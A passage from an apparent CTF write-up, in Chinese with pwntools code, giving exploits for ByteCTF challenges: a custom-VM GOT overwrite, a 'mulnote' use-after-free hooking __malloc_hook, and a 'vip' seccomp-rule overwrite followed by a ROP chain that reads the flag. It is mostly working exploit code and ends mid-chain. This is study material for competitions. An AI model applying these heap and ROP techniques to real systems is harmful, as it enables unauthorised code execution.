<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x01\x10</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>     <span class="c1"># add 0x30 =&gt; r0</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x03\x00</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">17</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>       <span class="c1"># mov r0 =&gt; ebp</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x01\x10</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x400</span><span class="p">)</span>    <span class="c1"># sub 0x400 =&gt; r2</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x03\x00</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>       <span class="c1"># mov r2 =&gt; esp</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x03\x22</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">17</span><span class="p">)</span>    <span class="c1"># mov [ebp] =&gt; [esp]</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x0A\x00</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>       <span class="c1"># pop [esp] =&gt; r11</span>

<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x01\x10</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>        <span class="c1"># add 0x4 =&gt; r0</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x03\x00</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">17</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>       <span class="c1"># mov r0 =&gt; ebp ; ebp = 0x34</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x03\x22</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">17</span><span class="p">)</span>    <span class="c1"># mov [ebp] =&gt; [esp]</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x0A\x00</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>       <span class="c1"># pop [esp] =&gt; r10</span>

<span class="c1"># get system</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x02\x10</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x47c30</span><span class="p">)</span> <span class="c1"># sub 0x47c30 =&gt; r11 ; r11 &lt;= system low 32 bit addr</span>

<span class="c1"># change free@got</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x02\x10</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x34</span><span class="p">)</span>     <span class="c1"># sub 0x34 =&gt; r0 ; set r0 to 0</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x03\x00</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">17</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>       <span class="c1"># mov r0 =&gt; ebp ; ebp = 0x0 &lt;= free@got</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x03\x02</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">17</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>      <span class="c1"># mov r11 =&gt; [ebp]</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x01\x10</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>        <span class="c1"># add 0x4 =&gt; r0</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x03\x00</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">17</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>       <span class="c1"># mov r0 =&gt; ebp ; ebp = 0x4</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x03\x02</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">17</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>      <span class="c1"># mov r10 =&gt; [ebp]</span>

<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\xFF</span><span class="s1">'</span>
<span class="n">memory_set</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mh">0x4010</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">)</span>
<span class="n">run</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'&gt;'</span><span class="p">,</span> <span class="s1">'M'</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'size&gt;'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>

<span class="c1">#bytectf{0ccf4027c269fcbd1d0a74ddd62ba90a}</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</pre></div>
<h3 data-content="1" id="9700fd99ccf78b0fa9467dd4382fa278">mulnote</h3>
<p>程序应该算加了混淆？但是还是很容易就能看清楚程序在做什么。漏洞在free的时候，thread中sleep后清空bss上的chunk地址，导致UAF。</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'&gt;'</span><span class="p">,</span> <span class="s1">'C'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'size&gt;'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">'note&gt;'</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">idx</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'&gt;'</span><span class="p">,</span> <span class="s1">'R'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'index&gt;'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'&gt;'</span><span class="p">,</span> <span class="s1">'S'</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">idx</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'&gt;'</span><span class="p">,</span> <span class="s1">'E'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'index&gt;'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">'new note&gt;'</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">'debug'</span>
    <span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'tmux'</span><span class="p">,</span> <span class="s1">'split'</span><span class="p">,</span> <span class="s1">'-h'</span><span class="p">]</span>

    <span class="n">DEBUG</span> <span class="o">=</span> <span class="bp">False</span>

    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="p">)</span>
    <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./mulnote'</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./mulnote'</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">'112.126.101.96'</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span>
        <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>

    <span class="n">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="s1">'sunichi'</span><span class="p">)</span> <span class="c1">#0</span>
    <span class="n">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="s1">'sunichi'</span><span class="p">)</span> <span class="c1">#1</span>
    <span class="n">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="s1">'sunichi'</span><span class="p">)</span> <span class="c1">#2</span>

    <span class="n">delete</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">show</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>

    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'[*]note[0]:</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">recv</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\x00\x00</span><span class="s1">'</span>
    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">recv</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="mh">0x7fc642ab9b78</span> <span class="o">-</span> <span class="mh">0x00007fc6426f5000</span><span class="p">)</span>

    <span class="n">delete</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'__malloc_hook'</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x23</span><span class="p">))</span>

    <span class="n">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="s1">'sunichi'</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="s1">'</span><span class="se">\x00\x00\x00</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xf02a4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'realloc'</span><span class="p">]))</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'&gt;'</span><span class="p">,</span> <span class="s1">'C'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'size&gt;'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span>
<span class="c1">#bytectf{4f10583325b7a40ecd770dbb6fd54d59}</span>
    <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
    <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
    <span class="n">pwn</span><span class="p">()</span>
</pre></div>
<h3 data-content="1" id="2b241e2f2dfd8a431d930a01362ca4ef">vip</h3>
<p>设置prctl的时候有栈溢出，通过栈溢出修改prctl的规则，使得open(urandom)的时候返回0从而绕过限制。最后做ROP进行orw就可以读出flag了。</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>


<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">idx</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Your choice: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Index: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">idx</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Your choice: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Index: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">idx</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Your choice: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Index: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="o">=</span><span class="s1">''</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Your choice: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Index: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Size: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">content</span> <span class="o">==</span> <span class="s1">''</span><span class="p">:</span>
        <span class="k">return</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">disable_sandbox</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span> <span class="o">*</span> <span class="mh">0x20</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x20\x00\x00\x00\x00\x00\x00\x00</span><span class="s1">'</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x15\x00\x01\x00\x01\x01\x00\x00</span><span class="s1">'</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x06\x00\x00\x00\x00\x00\xFF\x7F</span><span class="s1">'</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x06\x00\x00\x00\x00\x00\x05\x00</span><span class="s1">'</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Your choice: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">'please tell us your name: </span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
    <span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'tmux'</span><span class="p">,</span> <span class="s1">'split'</span><span class="p">,</span> <span class="s1">'-h'</span><span class="p">]</span>
    <span class="n">DEBUG</span> <span class="o">=</span> <span class="bp">False</span>

    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="p">)</span>
    <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./vip'</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./vip'</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">'112.126.103.14'</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span>
        <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>

    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">'debug'</span>

    <span class="n">disable_sandbox</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>

    <span class="n">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s1">'a'</span> <span class="o">*</span> <span class="mh">0x58</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404100</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span>


    <span class="n">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="s1">'./flag</span><span class="se">\x00</span><span class="s1">'</span><span class="p">),</span> <span class="s1">'./flag</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span> <span class="c1">#heapaddr</span>
    <span class="n">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404108</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">'puts'</span><span class="p">])</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span>

    <span class="n">show</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\x00\x00</span><span class="s1">'</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'puts'</span><span class="p">]</span>

    <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'__environ'</span><span class="p">])</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span>

    <span class="n">show</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">stack_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\x00\x00</span><span class="s1">'</span><span class="p">)</span>

    <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404110</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span>
    <span class="n">show</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">heap_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'</span><span class="se">\n</span><span class="s1">Done'</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>

    <span class="n">ret_rop</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">-</span> <span class="p">(</span><span class="mh">0x7ffc05877e58</span> <span class="o">-</span> <span class="mh">0x7ffc05877d68</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret_rop</span><span class="p">))</span>


    <span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x00000000004018fb</span>
    <span class="n">pop_rsi_r15_ret</span> <span class="o">=</span> <span class="mh">0x00000000004018f9</span>
    <span class="n">pop_rdx_ret</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x0000000000001b96</span>
    <span class="n">syscall_ret</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x00000000000d2975</span>
    <span class="n">pop_rax_ret</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x00000000000439c8</span>
    <span class="n">leave_ret</span> <span class="o">=</span> <span class="mh">0x0000000000401445</span>
    <span class="n">pop_rbp_ret</span> <span class="o">=</span> <span class="mh">0x00000000004011d9</span>


    <span class="n">rop</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">)</span>
    <span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_r15_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span>

    <span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_r15_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00404800</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> 
    <span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">'read'</span><span class="p">])</span>

